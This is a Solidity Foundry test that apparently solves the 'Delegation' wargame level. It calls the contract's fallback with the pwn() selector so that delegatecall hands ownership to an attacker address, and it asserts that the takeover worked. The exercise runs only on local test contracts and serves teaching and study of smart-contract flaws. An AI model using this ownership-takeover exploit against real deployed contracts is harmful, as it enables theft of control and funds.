// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../06_Delegation/Delegation.sol";

contract DelegationTest is Test {
    Delegation public delegation;
    Delegate public delegate;
    address public victim;
    address public attacker;

    function setUp() public {
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
        delegate = new Delegate(victim);
        delegation = new Delegation(address(delegate));
        console.log("addresses of victim/attacker: %s/%s", victim, attacker);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        address old_owner = delegation.owner();
        // Call the fallback function of Delegation contract
        // to execute the pwn function in Delegate contract
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        assertTrue(success, "Call failed");

        // Check if the owner of Delegate contract is now the attacker
        assertNotEq(delegate.owner(), attacker, "Exploit failed: delegate's ownership shouldn't be transferred");
        assertEq(delegation.owner(), attacker, "Exploit failed: delegation's ownership not transferred");
        console.log("Exploit successful: ownership transferred from %s to %s", old_owner, attacker);
        vm.stopPrank();
    }
}
